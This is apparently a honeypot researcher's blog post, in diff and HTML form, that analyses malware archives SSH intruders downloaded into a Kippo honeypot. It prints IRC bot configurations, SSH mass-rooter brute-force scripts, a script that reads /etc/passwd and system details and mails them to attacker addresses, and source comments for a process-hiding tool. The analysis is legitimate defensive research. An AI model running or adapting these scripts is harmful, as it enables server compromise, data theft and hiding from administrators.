+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">3</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">mfu</span><span class="nc">.txt</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">4</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">screen</span>
+<span class="nt">goshNEW</span><span class="o">/</span><span class="nt">go</span><span class="nc">.shA</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">goshNEW</span><span class="err">#</span> <span class="nt">screen</span>
+<span class="nt">bash</span><span class="o">:</span> <span class="nt">screen</span><span class="o">:</span> <span class="nt">command</span> <span class="nt">not</span> <span class="nt">found</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">goshNEW</span><span class="err">#</span> <span class="o">./</span><span class="nt">screen</span>
+<span class="nt">Shall</span> <span class="nt">we</span> <span class="nt">play</span> <span class="nt">a</span> <span class="nt">game</span><span class="o">?</span> 
+<span class="nt">A</span> <span class="nt">strange</span> <span class="nt">game</span><span class="o">.</span> <span class="nt">The</span> <span class="nt">only</span> <span class="nt">winning</span> <span class="nt">move</span> <span class="nt">is</span> <span class="nt">not</span> <span class="nt">to</span> <span class="nt">play</span><span class="o">.</span>  <span class="nt">How</span> <span class="nt">about</span> <span class="nt">a</span> <span class="nt">nice</span> <span class="nt">game</span> <span class="nt">of</span> <span class="nt">chess</span><span class="o">?</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">goshNEW</span><span class="err">#</span> 
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">goshNEW</span><span class="err">#</span> <span class="nt">apt-get</span> <span class="nt">install</span> <span class="nt">screen</span>
+<span class="nt">Reading</span> <span class="nt">package</span> <span class="nt">lists</span><span class="o">...</span> <span class="nt">Done</span>
+<span class="nt">Building</span> <span class="nt">dependency</span> <span class="nt">tree</span>
+<span class="nt">Reading</span> <span class="nt">state</span> <span class="nt">information</span><span class="o">...</span> <span class="nt">Done</span>
+<span class="nt">The</span> <span class="nt">following</span> <span class="nt">NEW</span> <span class="nt">packages</span> <span class="nt">will</span> <span class="nt">be</span> <span class="nt">installed</span><span class="o">:</span>
+  <span class="nt">screen</span> 
+<span class="nt">0</span> <span class="nt">upgraded</span><span class="o">,</span> <span class="nt">1</span> <span class="nt">newly</span> <span class="nt">installed</span><span class="o">,</span> <span class="nt">0</span> <span class="nt">to</span> <span class="nt">remove</span> <span class="nt">and</span> <span class="nt">259</span> <span class="nt">not</span> <span class="nt">upgraded</span><span class="o">.</span>
+<span class="nt">Need</span> <span class="nt">to</span> <span class="nt">get</span> <span class="nt">774</span><span class="nc">.2kB</span> <span class="nt">of</span> <span class="nt">archives</span><span class="o">.</span>
+<span class="nt">After</span> <span class="nt">this</span> <span class="nt">operation</span><span class="o">,</span> <span class="nt">1702</span><span class="nc">.8kB</span> <span class="nt">of</span> <span class="nt">additional</span> <span class="nt">disk</span> <span class="nt">space</span> <span class="nt">will</span> <span class="nt">be</span> <span class="nt">used</span><span class="o">.</span>
+<span class="nt">Get</span><span class="nd">:1</span> <span class="nt">http</span><span class="o">://</span><span class="nt">ftp</span><span class="nc">.debian.org</span> <span class="nt">stable</span><span class="o">/</span><span class="nt">main</span> <span class="nt">tmpgoshNEWscreen</span> <span class="nt">0</span><span class="nc">.19-7</span> <span class="cp">[</span><span class="mf">774.2</span><span class="nx">kB</span><span class="cp">]</span>
+<span class="nt">Fetched</span> <span class="nt">774</span><span class="nc">.2kB</span> <span class="nt">in</span> <span class="nt">1s</span> <span class="o">(</span><span class="nt">4493B</span><span class="o">/</span><span class="nt">s</span><span class="o">)</span>
+<span class="nt">Reading</span> <span class="nt">package</span> <span class="nt">fields</span><span class="o">...</span> <span class="nt">Done</span>
+<span class="nt">Reading</span> <span class="nt">package</span> <span class="nt">status</span><span class="o">...</span> <span class="nt">Done</span>
+<span class="o">(</span><span class="nt">Reading</span> <span class="nt">database</span> <span class="o">...</span> <span class="nt">177887</span> <span class="nt">files</span> <span class="nt">and</span> <span class="nt">directories</span> <span class="nt">currently</span> <span class="nt">installed</span><span class="o">.)</span>
+<span class="nt">Unpacking</span> <span class="nt">tmpgoshNEWscreen</span> <span class="o">(</span><span class="nt">from</span> <span class="o">.../</span><span class="nt">archives</span><span class="o">/</span><span class="nt">tmpgoshNEWscreen_0</span><span class="nc">.19-7_i386.deb</span><span class="o">)</span> <span class="o">...</span>
+<span class="nt">Processing</span> <span class="nt">triggers</span> <span class="nt">for</span> <span class="nt">man-db</span> <span class="o">...</span>
+<span class="nt">Setting</span> <span class="nt">up</span> <span class="nt">tmpgoshNEWscreen</span> <span class="o">(</span><span class="nt">0</span><span class="nc">.19-7</span><span class="o">)</span> <span class="o">...</span>
+<span class="nt">server</span><span class="o">:/</span><span class="nt">tmp</span><span class="o">/,/</span><span class="nt">goshNEW</span><span class="err">#</span> <span class="nt">screen</span>
+</pre></div>
+
+
+<h1>Malware&nbsp;analysis</h1>
+<p>Kippo also provides another handy function: it stores any downloaded files. This allows us to further analyze some of the malware used by the&nbsp;intruders.</p>
+<h2>File&nbsp;http___fiunic_eu_pub.tgz</h2>
+<p>An archive containing what looks like source code for an <span class="caps">SSH</span>&nbsp;server.</p>
+<h2>File&nbsp;http___pinky_clan_su_mech_fast.tgz</h2>
+<p>This archive contains an <span class="caps">IRC</span> bot. <code>configure.c</code> shows:</p>
+<div class="highlight"><pre><span class="c1">#############CONF##############</span>
+<span class="k">my</span> <span class="nv">$hidden</span> <span class="o">=</span> <span class="s">&#39;/usr/sbin/apache/log&#39;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">$linas_max</span><span class="o">=</span><span class="s">&#39;4&#39;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">$sleep</span><span class="o">=</span><span class="s">&#39;5&#39;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">@admins</span><span class="o">=</span><span class="p">(</span><span class="s">&quot;Senil&quot;</span><span class="p">,</span><span class="s">&quot;Dereglat&quot;</span><span class="p">);</span>
+<span class="k">my</span> <span class="nv">@hostauth</span><span class="o">=</span><span class="p">(</span><span class="s">&quot;Senil.users.quakenet.org&quot;</span><span class="p">,</span><span class="s">&quot;Dereglat.users.quakenet.org&quot;</span><span class="p">);</span>
+<span class="k">my</span> <span class="nv">@channels</span><span class="o">=</span><span class="p">(</span><span class="s">&quot;#anyone312&quot;</span><span class="p">);</span>
+<span class="k">my</span> <span class="nv">$nick</span><span class="o">=</span><span class="s">&#39;bombon&#39;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">$ircname</span> <span class="o">=</span><span class="s">&#39;furt&#39;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">$realname</span> <span class="o">=</span> <span class="s">&#39;pe fatza&#39;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">$server</span><span class="o">=</span><span class="s">&#39;multiplay.uk.quakenet.org&#39;</span><span class="p">;</span>
+<span class="k">my</span> <span class="nv">$port</span><span class="o">=</span><span class="s">&#39;6667&#39;</span><span class="p">;</span>
+<span class="c1">##############################</span>
+</pre></div>
+
+
+<p>Joining the channel on Quakenet reveals nothing.
+The archive also contains an executable called <code>bash</code>. This is a compiled EnergyMech <span class="caps">IRC</span> bot. The source code is also included in the archive, together with configuration:
+    <span class="caps">SERVER</span> diemen.nl.eu.undernet.org 6667
+    <span class="caps">SERVER</span> London2.<span class="caps">UK</span>.<span class="caps">EU</span>.Undernet.Org 6667
+    <span class="caps">SERVER</span> 62.231.74.10 6667
+    <span class="caps">SERVER</span> lelystad.nl.eu.undernet.org 6667
+    <span class="caps">SERVER</span> mesa.az.us.undernet.org 6667
+    <span class="caps">SERVER</span> Zagreb.Hr.<span class="caps">EU</span>.UnderNet.org 6667
+    <span class="caps">SERVER</span> Helsinki.<span class="caps">FI</span>.<span class="caps">EU</span>.Undernet.org 6667
+    <span class="caps">SERVER</span> Carouge.<span class="caps">CH</span>.<span class="caps">EU</span>.Undernet.org 6667
+    <span class="caps">SERVER</span> us.undernet.org 6667
+    <span class="caps">SERVER</span> oslo2.no.eu.undernet.org 6667
+    <span class="caps">ENTITY</span> x
+    ###<span class="caps">BOT</span> 1###
+    <span class="caps">NICK</span> Red-hack1
+    <span class="caps">USERFILE</span> 1.user
+    <span class="caps">CMDCHAR</span> .
+    <span class="caps">LOGIN</span> rosu
+    <span class="caps">IRCNAME</span>  4®  12Welcome  3in  14My  4World 13!!!  7®<br />
+    <span class="caps">MODES</span> +ix-ws
+    <span class="caps">HASONOTICE</span>
+    <span class="caps">TOG</span> <span class="caps">CC</span>          1
+    <span class="caps">TOG</span> <span class="caps">CLOAK</span>       1
+    <span class="caps">TOG</span> <span class="caps">SPY</span>         1
+    <span class="caps">SET</span> <span class="caps">OPMODES</span>     6
+    <span class="caps">SET</span> <span class="caps">BANMODES</span>    6
+    <span class="caps">CHANNEL</span>         #canalul-tau
+    <span class="caps">TOG</span> <span class="caps">PUB</span>         1
+    <span class="caps">TOG</span> <span class="caps">MASS</span>        1
+    <span class="caps">TOG</span> <span class="caps">SHIT</span>        1
+    <span class="caps">TOG</span> <span class="caps">PROT</span>        1
+    <span class="caps">TOG</span> <span class="caps">ENFM</span>        0
+    <span class="caps">SET</span> <span class="caps">MKL</span>         7
+    <span class="caps">SET</span> <span class="caps">MBL</span>         7
+    <span class="caps">SET</span> <span class="caps">MPL</span>         1
+Also here, joining the channel does nothing.
+The archive also contains a shell script, used to check if the bot is still running and to restart it:
+    #! /bin/sh
+    <span class="caps">RUN</span>=./bash
+    <span class="caps">OPT</span>=
+    <span class="caps">OUTPUT</span>=./mech.cron
+    if [ -r mech.pid ]; then
+      <span class="caps">PID</span>=<code>cat mech.pid</code>
+      if [ -r /proc/$<span class="caps">PID</span> ]; then
+        exit 0
+      fi
+      if ( kill -0 $<span class="caps">PID</span> 1&gt; /dev/null 2&gt; /dev/null ); then
+        exit 0
+      fi
+    fi
+    echo &gt;&gt; $<span class="caps">OUTPUT</span>
+    echo &#8220;Mech restarted:&#8221; &gt;&gt; $<span class="caps">OUTPUT</span>
+    ( date 2&gt;&amp;1 ) &gt;&gt; $<span class="caps">OUTPUT</span>
+    echo &gt;&gt; $<span class="caps">OUTPUT</span>
+    ( $<span class="caps">RUN</span> $<span class="caps">OPT</span> 2&gt;&amp;1 ) &gt;&gt; $<span class="caps">OUTPUT95</span>
+Shell scripts like these are often put in&nbsp;crontabs.</p>
+<h2>File&nbsp;http___arhiva_do_am_scan.tar</h2>
+<p>This archive contains the often repacked <code>pscan</code> and <code>ssh-scan</code> tools. A shell script called <code>start</code> contains:
+    #/bin/bash
+    # start.sh script
+    # part of ssh massrooter by pulea
+    # /j #r.o.o.t pt intrebari :)
+    if [ $# != 1 ]; then
+            echo &#8220;[+] pulea zice :&#8221;
+    sleep 3
+            echo &#8220;[+] sa-mi bag pula in creierii tai !&#8221;
+            echo &#8220;[+] ex. : $0 <b class>&#8221;
+            exit;
+    fi
+    clear
+    cat a1
+    if [ -f a4 ]; then
+    echo &#8220;[+] Checking files..&#8221;
+    sleep 3
+    echo &#8221; <span class="caps">OK</span>&#8221;
+    perl sshc.c
+    ./a $1.0
+    ./a $1.1
+    ./a $1.2
+    ./a $1.3
+    ./a $1.4
+    ./a $1.5
+    ./a $1.6
+    ./a $1.7
+    ./a $1.8
+    ./a $1.9
+    ./a $1.10
+    ./a $1.11
+    ./a $1.12
+    ./a $1.13
+    ./a $1.14
+    ./a $1.15
+    ./a $1.16
+    ./a $1.17
+    ./a $1.18
+    ./a $1.19
+    ./a $1.20
+    cat vuln.txt |mail -s &#8220;vuln.txt&#8221; luchian8@gmail.com
+    #<span class="caps">SNIP</span>
+    rm -rf sshc.c
+    killall -9 a 
+    killall -9 a
+    killall -9 pscan2
+    if [ &#8220;$(whoami)&#8221; != &#8220;root&#8221; ]; then
+    ./sshf
+    else
+    ./sshf0
+    fi
+    clear
+    echo &#8220;[+] momentul adevarului :)&#8221;
+    echo &#8220;[+] ne odihnim cateva secunde ..&#8221;
+    sleep 5
+    echo &#8220;&#8221;
+    cat vuln.txt
+    cat vuln.txt &gt;&gt; .vulnold.txt
+    echo &gt; vuln.txt
+    cat a6 &gt;&gt; vuln.txt
+    else
+    echo &#8220;[+] Checking files..&#8221;
+    sleep 3
+    echo &#8221; error&#8221;
+    echo &#8220;[+] Some file are missing&#8221;
+    echo &#8220;[+] Please reinistall it from your wget&#8221;
+    echo &#8220;[+] or ask pulea !&#8221;
+I wonder who this luchian8@gmail.com is&#8230; Anyway, <code>a</code> is another shell script running:
+    #!/bin/bash
+    ./pscan2 $1 22 
+    sleep 5
+    cat $1.pscan.22 |sort |uniq &gt; mfu.txt
+    oopsnr2=<code>grep -c . mfu.txt</code>
+    echo &#8220;&#8221;
+    echo &#8220;[+] Attacking $oopsnr2 servers!&#8221;
+    echo &#8220;&#8221;
+    perl sshc.c
+    rm -rf sshc.c
+    ./pass_sh
+    ./ssh-scan 100
+    rm -rf $1.pscan.22 mfu.txt
+    echo &#8220;&#8221;
+<code>pscan</code> is a basic port scanner for an <span class="caps">IP</span> block. <code>ssh-scan</code> is a password brute forcer. Other files just contain some dubious ascii art:
+     <strong>^</strong>                                                              <strong>^</strong>
+    ( <strong><em> )&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;( </em></strong> )
+     | / |               #help-bnc present`s:                           | \ |
+     | / |       OmAr&#8217;z ssh massrooter build on 11-01-2006              | \ |
+     | / |                                                              | \ |
+     | / |                  Thanks to :  OmAr                           | \ |
+     | / |                 and to all #OmAr members.                    | \ |
+     | / |                                                              | \ |
+     | / |    Fucks goes to : all hackers, we are script kiddies..      | \ |
+     | / |                    so what ? fuck off !                      | \ |
+     | / |                                                              | \ |
+     | / |                      <span class="caps">EOF</span> by OmAr                             | \ |
+     | / |&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;| \ |
+     |<strong><em>|</em></strong><strong><em>_</em></strong><strong><em>_[OmAr&#8217;z ssh massrooter by OmAr]</em></strong><strong><em>_</em></strong><strong><em>_</em></strong>|<strong><em>|
+    (</em></strong>__)&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;(_____)
+       ^&nbsp;^</p>
+<h2>File&nbsp;http___gblteam_webs_com_gosh.tgz.tar</h2>
+<p>Another repackaging of the <code>pscan</code>-<code>ssh-scan</code> combination. This one contains a script called <code>secure</code>:
+    #!/bin/bash
+    if [ <code>whoami</code> == &#8220;root&#8221; ]; then
+    chmod -x /usr/bin/mail
+    mv /usr/bin/mail /usr/bin/s8
+    echo &#8221; Done , You can scan now &#8221;
+    else
+    echo -e &#8221; you&#8217;re not root you&#8217;re <code>whoami</code> with id <code>id</code> !! &#8221;
+    fi
+&#8230; because disabling <code>mail</code> totally hides your tracks, yo.
+The script <code>scam</code> contains a variation of the script seen above:
+    #!/bin/bash
+    echo &#8220;[+] [+] [+] <span class="caps">RK</span> [+] [+] [+]&#8221; &gt;&gt; info2
+    echo &#8220;[+] [+] [+] <span class="caps">IP</span> [+] [+] [+]&#8221; &gt;&gt; info2
+    /sbin/ifconfig -a &gt;&gt; info2
+    echo &#8220;[+] [+] [+] uptime [+] [+] [+]&#8221; &gt;&gt; info2
+    uptime &gt;&gt; info2
+    echo &#8220;[+] [+] [+] uname -a [+] [+] [+]&#8221; &gt;&gt; info2
+    uname -a &gt;&gt; info2
+    echo &#8220;[+] [+] [+] /etc/issue [+] [+] [+]&#8221; &gt;&gt; info2
+    cat /etc/issue &gt;&gt; info2
+    echo &#8220;[+] [+] [+] passwd [+] [+] [+]&#8221; &gt;&gt; info2
+    cat /etc/passwd &gt;&gt; info2
+    echo &#8220;[+] [+] [+] id [+] [+] [+]&#8221; &gt;&gt; info2
+    id &gt;&gt; info2
+    echo &#8220;[+] [+] [+] Spatiu Hdd / pwd [+] [+] [+]&#8221; &gt;&gt; info2
+    df -h &gt;&gt; info2
+    pwd &gt;&gt; info2
+    cat info2 | mail -s &#8220;Scanner MaLa Port : ?? | Pass : stii tu :))&#8221; mafia89tm@yahoo.com
+    rm -rf info2
+    clear
+    echo &#8220;####################################################################&#8221; 
+    echo &#8220;#                          <strong><em>_</em><em>                                  &#8221;
+    echo &#8220;#                        .-.      .-.                               &#8221;
+    echo &#8220;#                       /            \                              &#8221;
+    echo &#8220;#                      |     zRR      |                             &#8221; 
+    echo &#8220;#                      |,  .-.  .-.  ,|                             &#8220;<br />
+    echo &#8220;#                      | )(z</em>/  \z_)( |                             &#8221; 
+    echo &#8220;#                      |/     /\     \|                             &#8221; 
+    echo &#8220;#              _       (<em>     ^^     </em>)                             &#8221; 
+    echo &#8220;#      _\ </strong>__) _<strong><em>_</em><em>_</em>|<span class="caps">IIIIII</span>|</strong>/<strong><em>_</em></strong><strong><em>_</em></strong><strong><em>_</em></strong><strong><em>_     &#8221; 
+    echo &#8220;#     (</em>)[</strong><em>]{}&lt;<strong><em>_</em></strong></em>|-\<span class="caps">IIIIII</span>/-|__zRR__zRR__zRR<strong><em>_</em></strong><strong><em>_\    &#8221; 
+    echo &#8220;#       /     )</em>/        \          /                               &#8221; 
+    echo &#8220;#                         \ </strong>____ /                              &#8221;
+    echo &#8220;#                         <span class="caps">SCANER</span> <span class="caps">PRIVAT</span>                             &#8221; 
+    echo &#8220;#             <span class="caps">SCANER</span> <span class="caps">FOLOSIT</span> <span class="caps">DOAR</span> <span class="caps">DE</span> <span class="caps">TEAMUL</span> MaLaSorTe               &#8221;
+    echo &#8220;#            <span class="caps">SACNERUL</span> <span class="caps">CONTINE</span> <span class="caps">UN</span> PASS_FLIE <span class="caps">DE</span> <span class="caps">3MEGA</span> !!              &#8221; 
+    echo &#8220;####################################################################&#8221;
+    if [ -f a ]; then
+    cat vuln.txt |mail -s &#8220;Lame Gang Us Roots&#8221; mafia89tm@yahoo.com
+    ./a $1.0
+    ./a $1.1
+    ./a $1.2
+    ./a $1.3
+    ./a $1.4
+    ./a $1.5
+    ./a $1.6
+    ./a $1.7
+    ./a $1.8
+    ./a $1.9
+    ./a $1.10
+    cat vuln.txt |mail -s &#8220;Lame Gang Us Roots&#8221; mafia89tm@yahoo.com
+    # <span class="caps">SNIP</span>
+    killall -9 a
+    else 
+    echo # Ciudat ..Nu Ai Urmat Instructiunile  #
+    echo # trebui dat mv assh a sau mv scan a   #
+    echo # orice ai avea tu &#8230; dohh ..         #
+    killall -9 a
+    killall -9 pscan2
+    fi
+&#8230; because writing a for-loop is too hard. I wonder who mafia89tm@yahoo.com is. Also, if you disable <code>mail</code>, how does <code>mail</code> work,&nbsp;exactly?</p>
+<h2>File:&nbsp;http___no_biju_com_merge_Arhive_devilflood.tar.gz</h2>
+<p>A package containing executables, probably used to DoS servers. <span class="caps">TCP</span>, <span class="caps">UDP</span>, <span class="caps">IRC</span> and <span class="caps">SMTP</span> flooders are present. There is a list of <span class="caps">IP</span> addresses in a txt file, probably targets.
+There are also a few configuration files with Undernet <span class="caps">IRC</span> channels, but joining them reveals no&nbsp;users.</p>
+<h2>File&nbsp;http___www_freewebs_com_iulianshooter_psyBNC2_3_2_4.tgz.tar.gz</h2>
+<p>This is <a href="http://www.psybnc.at/about.html">PsyBNC</a>:</p>
+<blockquote>
+<p>psyBNC is an easy-to-use, multi-user, permanent <span class="caps">IRC</span>-Bouncer with many features. Some of its features include symmetric ciphering of talk and connections (Blowfish and <span class="caps">IDEA</span>), the possibility of linking multiple bouncers to an internal network including a shared partyline, vhost- and relay support to connected bouncers and an extensive online help system. Many other helpful functions are included. It compiles on Linux, FreeBSD, SunOs and&nbsp;Solaris.</p>
+</blockquote>
+<h2>File&nbsp;http___eu_ro_ca_img.tar</h2>
+<p>Another package containing <code>pscan</code>. There&#8217;s also an <span class="caps">IRC</span> bot present:
+    echo &#8220;<span class="caps">SERVER</span> 82.196.213.250 6666&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">SERVER</span> 208.83.20.130 6667&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">SERVER</span> 195.197.175.21 6669&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">ENTITY</span> $2&#8221; &gt;&gt; m.set
+    echo &#8220;### <span class="caps">BOT</span> 1 ###&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">NICK</span> ${denomination[$((<span class="caps">RANDOM</span>%num_denominations))]}&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">USERFILE</span> $2.user&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">CMDCHAR</span> .&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">LOGIN</span> ${denomination[$((<span class="caps">RANDOM</span>%num_denominations))]}&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">IRCNAME</span> ${denomination[$((<span class="caps">RANDOM</span>%num_denominations))]}&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">MODES</span> +iwsx&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">HASONOTICE</span>&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">VIRTUAL</span> $2&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">TOG</span> <span class="caps">CC</span>          1&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">TOG</span> <span class="caps">CLOAK</span>       1&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">TOG</span> <span class="caps">SPY</span>         1&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">SET</span> <span class="caps">OPMODES</span>     6&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">SET</span> <span class="caps">BANMODES</span>    6&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">CHANNEL</span>         #$1 &#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">TOG</span> <span class="caps">PUB</span>         1&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">TOG</span> <span class="caps">MASS</span>        1&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">TOG</span> <span class="caps">SHIT</span>        1&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">TOG</span> <span class="caps">PROT</span>        1&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">TOG</span> <span class="caps">ENFM</span>        0&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">SET</span> <span class="caps">MKL</span>         7&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">SET</span> <span class="caps">MBL</span>         7&#8221; &gt;&gt; m.set
+    echo &#8220;<span class="caps">SET</span> <span class="caps">MPL</span>         1&#8221; &gt;&gt; m.set
+Looking at the intercepted logs (see above) reveals the used channels. Joining this channel leads you to an active community of rooters selling shells on hacked&nbsp;servers.</p>
+<h2>File&nbsp;http___freewebtown_com_pacalici_lib.tgz</h2>
+<p>Again an <span class="caps">IRC</span> bot, together with a shell script checking if the bot is running called <code>y2kupdate</code> (nice try). There&#8217;s also source code for a hider program:
+    /<em>
+    psf &#8212; Process Stack Faker (a.k.a. Fucker)
+    Coded by Stas; (C)opyLeft by SysD Destructive Labs, 1997-2003
+    Tested on: FreeBSD 4.3, Linux 2.4, NetBSD 1.5, Solaris 2.7
+    Compile with:
+    # gcc -O2 -o h h.c
+    # strip h
+    Did you ever need to </em>hide<em> what are you doing on somewhat like public
+    server? Like Quake server or maybe John The Ripper? &#8216;Cos when your admin
+    run &#8220;ps auwx&#8221; or &#8220;top&#8221; and sees process like that, it&#8217;s probable you&#8217;ll
+    loose your shell on that server. So, what to do? Rootkit is a good solution
+    but you need root privilegies to install it and it&#8217;s a bit overkill for
+    running an inoffensive eggdrop bot (belive me, I saw user installing rootkit
+    just to hide eggdrop!). Well, this little proggie does a job for you. It
+    </em>will not<em> erase some entry you wish to hide from process stack. It just
+    changes a commandline for &#8220;ps&#8221; entry ;)
+    This principle is widely used in many security-related programs. Nmap was
+    the first I saw. How does this technique works? Take a look at execv(3)
+    system call:
+    int execv( const char </em>path, char *const argv[]);
+    &#8216;path&#8217; is a path to executable file. And &#8216;argv&#8217; array is&#8230; Well, it&#8217;s
+    just the same &#8216;argv&#8217;&nbsp;from:</p>
+<div class="highlight"><pre><span class="nb">int</span> <span class="n">main</span>(<span class="nb">int</span> <span class="n">argc</span>, <span class="n">char</span> *<span class="n">argv</span>[])
+<span class="k">where</span> <span class="s">&#39;argv[0]&#39;</span> <span class="k">is</span> <span class="n">a</span> <span class="n">commandline</span> <span class="o">and</span> <span class="s">&#39;argv[1]&#39;</span> <span class="o">and</span> <span class="n">higher</span> <span class="n">are</span> <span class="n">paramenters</span>.
+<span class="n">Normally</span> <span class="s">&#39;argv[0]&#39;</span> <span class="n">receives</span> <span class="n">the</span> <span class="n">same</span> <span class="nb">value</span> <span class="k">as</span> <span class="s">&#39;path&#39;</span> <span class="nb">from</span> <span class="n">execv</span>(<span class="mi">3</span>). <span class="n">But</span> <span class="n">you</span>
+<span class="o">also</span> <span class="nb">can</span> <span class="k">use</span> <span class="n">other</span> <span class="nb">values</span>! <span class="n">For</span> <span class="n">example</span>, <span class="k">when</span> <span class="n">you</span> <span class="nb">run</span> <span class="n">Nmap</span>, <span class="n">it</span> <span class="nb">can</span> <span class="n">execv</span>(<span class="mi">3</span>)
+<span class="n">itself</span> <span class="n">with</span> <span class="n">commandline</span> <span class="n">changed</span> <span class="nb">to</span> <span class="s">&#39;pine&#39;</span>. <span class="n">OK</span>, <span class="n">commandline</span> <span class="k">is</span> <span class="n">gone</span>. <span class="n">But</span> <span class="n">what</span>
+<span class="nb">to</span> <span class="k">do</span> <span class="n">with</span> <span class="n">paramenters</span>? <span class="n">Nmap</span> <span class="n">uses</span> <span class="n">environment</span> <span class="nb">to</span> <span class="n">send</span> <span class="n">paramenters</span> <span class="n">user</span> <span class="n">passed</span>
+<span class="nb">to</span> <span class="s">&#39;spoofed&#39;</span> <span class="n">process</span> <span class="o">and</span> <span class="n">ignores</span> <span class="n">other</span> <span class="n">paramenters</span>. <span class="n">If</span> <span class="n">you</span> <span class="n">wish</span> <span class="nb">to</span> <span class="n">spoof</span>
+<span class="s">&#39;nmap -sS -vv -O -P0 -o lhost.log localhost&#39;</span> <span class="k">as</span> <span class="s">&#39;pine -i&#39;</span>, <span class="n">Nmap</span> <span class="s">&quot;remembers&quot;</span>
+<span class="n">it&#39;s</span> <span class="n">specific</span> <span class="n">switches</span> <span class="o">and</span> <span class="n">re-execs</span> <span class="n">itself</span> <span class="k">as</span> <span class="s">&#39;pine&#39;</span> <span class="n">with</span> <span class="n">parameter</span> <span class="s">&#39;-i&#39;</span>.
+<span class="n">Fine</span>! <span class="n">But</span> <span class="n">John</span> <span class="n">The</span> <span class="n">Ripper</span>, <span class="n">Quake</span> <span class="n">server</span> &amp; <span class="n">eggdrop</span> <span class="n">can&#39;t</span> <span class="n">fake</span> <span class="n">parameters</span> <span class="n">in</span>
+<span class="n">this</span> <span class="n">way</span>!!! <span class="n">What&#39;s</span> <span class="n">the</span> <span class="n">other</span> <span class="n">way</span>? <span class="n">Sorry</span>, <span class="n">it&#39;s</span> *<span class="n">very</span>* <span class="n">dumb</span> <span class="o">and</span> *<span class="n">very</span>* <span class="n">ugly</span>...
+<span class="n">What</span> <span class="n">happens</span> <span class="k">if</span> <span class="n">you</span> <span class="n">change</span> <span class="n">commandline</span> <span class="nb">to</span> <span class="n">something</span> <span class="n">like:</span>
+<span class="s">&#39;pine -i                                            &#39;</span>
+(<span class="n">Ya</span>, <span class="s">&#39;pine -i&#39;</span> <span class="n">plus</span> <span class="n">many</span> <span class="n">space</span> <span class="n">characters</span> <span class="mh">0x20</span>)? <span class="n">Hahah</span>, <span class="s">&quot;ps&quot;</span>, <span class="s">&quot;top&quot;</span> &amp; <span class="n">many</span>
+<span class="n">other</span> <span class="n">monitors</span> <span class="n">just</span> <span class="nb">shift</span> <span class="n">away</span> *<span class="n">real</span>* <span class="n">parameters</span>! <span class="n">So</span>, <span class="n">you</span> <span class="n">don&#39;t</span> <span class="n">hide</span> <span class="n">them</span>,
+<span class="n">just</span> <span class="nb">shift</span> <span class="n">away</span> <span class="nb">from</span> <span class="n">screen</span>. <span class="n">Such</span> <span class="n">a</span> <span class="s">&quot;algorithm&quot;</span> <span class="n">doesn&#39;t</span> <span class="n">needs</span> <span class="n">neither</span> <span class="n">rootkits</span>,
+<span class="n">neither</span> <span class="n">special</span> <span class="n">privilegies</span>! <span class="nb">Any</span> <span class="n">user</span> <span class="nb">can</span> <span class="k">do</span> <span class="n">that</span> <span class="n">at</span> <span class="nb">any</span> <span class="nb">time</span>!!! *<span class="n">That&#39;s</span>* <span class="s">&quot;psf&quot;</span>
+<span class="nb">does</span>. <span class="n">Try</span> <span class="n">this:</span>
+<span class="c-Singleline"># psf -s &quot;pine -i&quot; sleep 30 &amp;</span>
+[<span class="mi">1</span>] <span class="mi">440</span>
